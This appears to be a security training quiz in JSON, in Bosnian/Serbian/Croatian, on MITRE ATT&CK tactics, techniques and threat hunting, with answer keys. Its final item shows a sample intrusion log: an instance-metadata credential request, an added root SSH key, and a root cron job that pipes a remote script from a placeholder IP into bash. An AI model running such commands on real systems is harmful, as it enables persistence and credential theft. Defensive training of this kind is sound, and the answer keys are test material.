@@ -1,0 +1,77 @@
+[
+  {
+    "q": "U ATT&CK terminologiji, šta odgovara na pitanje 'ZAŠTO' napadač nešto radi?",
+    "options": ["Tehnika", "Taktika", "Procedura", "Mitigacija"],
+    "answer": 1,
+    "explain": "Taktika je cilj (npr. Persistence), tehnika je način (npr. Cron), a procedura je konkretna implementacija koju koristi određena grupa."
+  },
+  {
+    "q": "Koliko taktika ima Enterprise matrica u ATT&CK v19?",
+    "options": ["12", "14", "15", "18"],
+    "answer": 2,
+    "explain": "U v19 (april 2026) Defense Evasion je podijeljen na Stealth i Defense Impairment, pa je broj taktika porastao sa 14 na 15."
+  },
+  {
+    "q": "Napadač zaustavlja EDR agenta i briše logove sa servera. Koja taktika iz v19 to najbolje opisuje?",
+    "options": ["Stealth (TA0005)", "Defense Impairment (TA0112)", "Discovery (TA0007)", "Impact (TA0040)"],
+    "answer": 1,
+    "explain": "Defense Impairment opisuje aktivno onesposobljavanje sigurnosnih mehanizama i alata, tako da branioci ne vide ili ne vjeruju onome što vide. Stealth je skrivanje aktivnosti da izgleda normalno."
+  },
+  {
+    "q": "Malver svoj proces naziva 'kworker/0:1' da bi izgledao kao kernel thread. Koja taktika?",
+    "options": ["Stealth", "Defense Impairment", "Credential Access", "Execution"],
+    "answer": 0,
+    "explain": "Maskiranje (masquerading) skriva aktivnost tako da izgleda kao legitimna. Ništa nije onesposobljeno, pa se ne radi o Defense Impairment."
+  },
+  {
+    "q": "Šta znači oznaka T1053.003?",
+    "options": ["Taktika 1053, verzija 3", "Podtehnika 003 (Cron) tehnike T1053 (Scheduled Task/Job)", "Treća grupa koja koristi T1053", "CVE povezan sa cronom"],
+    "answer": 1,
+    "explain": "T označava tehniku, a sufiks .003 podtehniku. TA su taktike, G grupe, S softver, M mitigacije."
+  },
+  {
+    "q": "Prema Pyramid of Pain, blokiranje čega napadaču stvara NAJVIŠE problema?",
+    "options": ["Hash vrijednosti malvera", "IP adresa C2 servera", "Domena", "TTP-ova (ponašanja)"],
+    "answer": 3,
+    "explain": "Hash se mijenja jednim bajtom, a IP i domen jeftino. Promjena ponašanja traži nove alate, obuku i način rada."
+  },
+  {
+    "q": "Koje artefakte tražiš kad loviš perzistenciju na Linux serveru? (više odgovora)",
+    "options": ["Nove linije u /etc/cron.d i crontabovima", "Nepoznate ključeve u authorized_keys", "Nalozi sa UID 0 osim root", "Veličinu /tmp particije"],
+    "answer": [0, 1, 2],
+    "explain": "Cron (T1053.003), SSH ključevi (T1098.004) i dodatni root nalozi (T1136.001) su klasične Linux perzistencije. Veličina particije nije indikator."
+  },
+  {
+    "q": "Za šta se koristi ATT&CK Navigator?",
+    "options": ["Za skeniranje ranjivosti", "Za vizuelizaciju i bojenje tehnika, npr. prikaz pokrivenosti detekcijama ili tehnika neke grupe", "Za pisanje Sigma pravila", "Za pokretanje napada"],
+    "answer": 1,
+    "explain": "Navigator pravi slojeve (layers) preko matrice, pa se lako vidi gdje su rupe u detekciji ili koje tehnike koristi određena grupa."
+  },
+  {
+    "q": "Šta je Atomic Red Team?",
+    "options": ["MITRE-ova lista APT grupa", "Biblioteka malih testova po ATT&CK tehnikama za provjeru da li detekcije rade", "Komercijalni SIEM", "Standard za ocjenu ranjivosti"],
+    "answer": 1,
+    "explain": "Atomic testovi (Red Canary) emuliraju po jednu tehniku, pa SOC vidi da li se odgovarajući alarm stvarno aktivira."
+  },
+  {
+    "q": "Aplikacija u EC2 instanci pravi pozive na 169.254.169.254 i preuzima kredencijale IAM uloge, a to inače ne radi. Koja tehnika?",
+    "options": ["T1552.005 Cloud Instance Metadata API (Credential Access)", "T1496 Resource Hijacking", "T1053.003 Cron", "T1190 Exploit Public-Facing Application"],
+    "answer": 0,
+    "explain": "Metadata servis izdaje privremene kredencijale uloge instance. Napadači do njega često dolaze preko SSRF-a. Odbrana: IMDSv2 i minimalna prava uloge."
+  },
+  {
+    "q": "Zašto ATT&CK ima prednost nad Cyber Kill Chainom za pisanje detekcija?",
+    "options": ["Kill Chain je tajan", "ATT&CK je detaljniji i pokriva ponašanje nakon ulaska u okruženje, gdje se detekcija najviše piše", "Kill Chain ne postoji za Linux", "ATT&CK automatski blokira napade"],
+    "answer": 1,
+    "explain": "Kill Chain je dobar okvir za komunikaciju, ali je faza 'Actions on Objectives' preširoka. ATT&CK razlaže to na stotine konkretnih tehnika."
+  },
+  {
+    "type": "multi",
+    "q": "Na osnovu ovog loga, koje tehnike PERZISTENCIJE iz ATT&CK-a je napadač iskoristio? (više odgovora)",
+    "lang": "log",
+    "snippet": "Oct 28 02:13:55 web01 sshd[4098]: Failed password for deploy from 203.0.113.45 port 51090 ssh2\nOct 28 02:14:07 web01 sshd[4121]: Accepted password for deploy from 203.0.113.45 port 51122 ssh2\nOct 28 02:15:31 web01 sudo: deploy : USER=root ; COMMAND=/usr/bin/curl -s http://169.254.169.254/latest/\nOct 28 02:16:02 web01 sudo: deploy : USER=root ; COMMAND=/usr/bin/tee -a /root/.ssh/authorized_keys\nOct 28 02:16:40 web01 sudo: deploy : USER=root ; COMMAND=/usr/bin/crontab -u root /tmp/.c\nOct 28 02:16:41 web01 crontab[4377]: (root) REPLACE (root)\nOct 28 02:18:01 web01 CRON[4410]: (root) CMD (curl -s http://198.51.100.7/x.sh | bash)",
+    "options": ["T1098.004 SSH Authorized Keys", "T1053.003 Cron", "T1552.005 Cloud Instance Metadata API", "T1136.001 Local Account", "T1543.002 Systemd Service"],
+    "answer": [0, 1],
+    "explain": "tee -a /root/.ssh/authorized_keys dodaje napadačev ključ (T1098.004), a crontab -u root uz CRON red koji svakog minuta skida i pokreće skriptu je T1053.003. Poziv na 169.254.169.254 je T1552.005, ali to je taktika Credential Access, ne perzistencija. U logu nema novog korisnika ni systemd unita. Ulaz je bio T1078 Valid Accounts (prijava lozinkom naloga deploy)."
+  }
+]
